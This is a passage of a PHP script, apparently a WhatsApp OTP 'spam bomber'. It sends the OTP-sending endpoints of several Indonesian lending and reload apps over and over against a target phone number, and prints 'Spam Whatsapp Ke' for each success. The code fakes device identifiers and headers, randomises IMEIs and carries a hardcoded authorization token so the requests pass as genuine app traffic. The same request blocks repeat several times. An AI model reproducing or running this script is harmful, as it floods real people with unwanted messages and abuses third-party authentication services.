+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
